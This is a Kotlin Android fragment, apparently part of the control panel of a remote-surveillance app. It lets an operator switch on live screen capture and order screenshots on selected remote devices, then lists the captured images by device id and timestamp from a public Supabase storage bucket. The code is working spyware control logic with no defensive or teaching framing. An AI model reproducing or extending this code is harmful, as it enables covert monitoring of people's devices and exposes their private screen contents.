package com.example.devsync

  import android.os.Bundle
  import android.view.View
  import android.widget.Button
  import android.widget.Switch
  import android.widget.TextView
  import androidx.fragment.app.Fragment
  import androidx.recyclerview.widget.LinearLayoutManager
  import androidx.recyclerview.widget.RecyclerView
  import androidx.swiperefreshlayout.widget.SwipeRefreshLayout
  import kotlinx.coroutines.*

  class SpyFragment : Fragment(R.layout.fragment_spy) {

      private val admin get() = requireActivity() as AdminControlActivity
      private lateinit var rvScreenshots: RecyclerView
      private lateinit var adapter: ScreenshotListAdapter
      private lateinit var swipeSpy: SwipeRefreshLayout
      private val screenshotList = mutableListOf<ScreenshotItem>()

      override fun onViewCreated(view: View, savedInstanceState: Bundle?) {
          super.onViewCreated(view, savedInstanceState)

          swipeSpy = view.findViewById(R.id.swipeSpy)
          rvScreenshots = view.findViewById(R.id.rvScreenshots)
          adapter = ScreenshotListAdapter(screenshotList)
          rvScreenshots.layoutManager = LinearLayoutManager(requireContext())
          rvScreenshots.adapter = adapter

          val switchLive = view.findViewById<Switch>(R.id.switchLiveCapture)
          val tvStatus   = view.findViewById<TextView>(R.id.tvLiveCaptureStatus)

          switchLive.setOnCheckedChangeListener { _, on ->
              admin.sendToSelected { d -> d.child("live_capture_enabled").setValue(on) }
              tvStatus.text = if (on) "● Live: ON" else "● Stopped"
              tvStatus.setTextColor(if (on) 0xFF00FF88.toInt() else 0xFF8B949E.toInt())
          }

          view.findViewById<Button>(R.id.btnTakeScreenshot).setOnClickListener {
              admin.sendToSelected { d -> d.child("take_screenshot").setValue(true) }
          }

          // Refresh button
          view.findViewById<Button>(R.id.btnRefreshScreenshots).setOnClickListener {
              swipeSpy.isRefreshing = true
              loadScreenshots { swipeSpy.isRefreshing = false }
          }

          // Pull-to-refresh
          swipeSpy.setOnRefreshListener {
              loadScreenshots { swipeSpy.isRefreshing = false }
          }

          loadScreenshots(null)
      }

      override fun onResume() {
          super.onResume()
          loadScreenshots(null)
      }

      private fun loadScreenshots(onDone: (() -> Unit)?) {
          CoroutineScope(Dispatchers.IO).launch {
              val arr = admin.supabaseList("screenshots")
              val list = mutableListOf<ScreenshotItem>()
              for (i in 0 until arr.length()) {
                  try {
                      val obj  = arr.getJSONObject(i)
                      val name = obj.optString("name")
                      if (!name.endsWith(".jpg") && !name.endsWith(".jpeg")) continue
                      val noExt     = name.removeSuffix(".jpg").removeSuffix(".jpeg")
                      val lastUnder = noExt.lastIndexOf('_')
                      val ts  = if (lastUnder >= 0) noExt.substring(lastUnder + 1).toLongOrNull() ?: 0L else 0L
                      val did = if (lastUnder >= 0) noExt.substring(0, lastUnder) else noExt
                      val url = "${AdminControlActivity.SUPABASE_URL}/storage/v1/object/public/screenshots/$name"
                      list.add(ScreenshotItem(name, did, url, ts))
                  } catch (_: Exception) {}
              }
              list.sortByDescending { it.timestamp }
              withContext(Dispatchers.Main) {
                  screenshotList.clear(); screenshotList.addAll(list)
                  adapter.notifyDataSetChanged()
                  onDone?.invoke()
              }
          }
      }
  }
  